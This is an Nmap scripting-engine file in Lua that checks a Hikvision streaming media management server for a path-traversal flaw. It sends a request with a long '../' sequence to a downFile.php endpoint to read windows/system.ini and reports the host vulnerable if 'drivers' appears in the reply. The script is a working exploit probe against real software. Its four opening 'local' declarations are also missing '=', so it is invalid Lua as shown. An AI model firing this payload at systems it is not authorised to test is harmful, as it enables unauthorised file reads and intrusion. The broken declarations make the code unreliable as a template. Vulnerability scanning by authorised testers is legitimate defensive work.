local http require "http"
local string require "string"
local stdnse require "stdnse"
local shortport require "shortport"


description = [[
杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，
攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息
]]

author = "seaung"


portrule = shortport.http


action = function(host, port)
	local output = stdnse.output_table()
	local vuln_path = "/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini"
	local check_txt = "drivers"

	local response = http.get(host, port, vuln_path)

	if response.status == 200 then
		if string.find(response.body, check_txt) ~= nil then
			output = "[+] Found vulnerable"
		else
			output = "[-] Not Found vulnerable"
		end
	end
	return output
end
